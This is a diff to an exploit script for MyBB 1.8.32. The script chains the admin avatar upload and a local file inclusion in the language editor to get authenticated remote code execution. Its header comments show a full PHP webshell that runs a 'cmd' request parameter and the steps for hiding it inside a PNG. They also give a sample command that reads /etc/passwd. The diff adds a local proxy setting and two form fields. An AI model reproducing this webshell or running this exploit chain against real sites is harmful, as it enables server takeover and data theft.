@@ -12,12 +12,12 @@
 # (2). after doing that, then we are able to chain in "admin avatar upload" page: http://www.mybb1832.cn/admin/index.php?module=user-users&action=edit&uid=1#tab_avatar, and LFI in "Edit Language Variables" page: http://www.mybb1832.cn/admin/index.php?module=config-languages&action=edit&lang=english.
 # (3). This chained bugs can lead to Authenticated RCE.
 # (note). The user must have rights to add or update settings and update Avatar. This is tested on MyBB 1.8.32.
-
-
+#
+#
 # Exp Usage:
 # 1.first choose a png file that size less than 1kb
 # 2.then merge the png file with a php simple backdoor file using the following commands
-# mac@xxx-2 php-backdoor % cat simple-backdoor.php 
+# mac@xxx-2 php-backdoor % cat simple-backdoor.php
 # <?php
 # if(isset($_REQUEST['cmd'])){
 #         echo "<getshell success>";
@@ -27,10 +27,10 @@
 #         phpinfo();
 # }
 # ?>
-# mac@xxx-2 php-backdoor % ls     
+# mac@xxx-2 php-backdoor % ls
 # simple-backdoor.php     test.png
-# mac@xxx-2 php-backdoor % cat simple-backdoor.php >> test.png 
-# mac@xxx-2 php-backdoor % file test.png 
+# mac@xxx-2 php-backdoor % cat simple-backdoor.php >> test.png
+# mac@xxx-2 php-backdoor % file test.png
 # test.png: PNG image data, 16 x 16, 8-bit/color RGBA, non-interlaced
 # 3.finnally run the following commands to run the exp script to get RCE output! enjoy the shell...
 # python3 exp.py --host http://www.xxx.cn --username admin --password xxx --email xxx@qq.com --file avatar_1.png --cmd "cat /etc/passwd"
@@ -42,6 +42,7 @@ from bs4 import BeautifulSoup
 from requests_toolbelt import MultipartEncoder
 import re
 
+proxies = {"http":"http://127.0.0.1:8080"}
 
 r_clients = requests.Session()
 
@@ -123,6 +124,8 @@ def exploit(username, password, email, host, file, cmd):
         'my_post_key': my_post_key,
         'username': username,
         'email': email,
+        'postnum': "0",
+        'threadnum': "0",
         'avatar_upload': (filename, open(filename, 'rb'), 'image/png')
     }
 
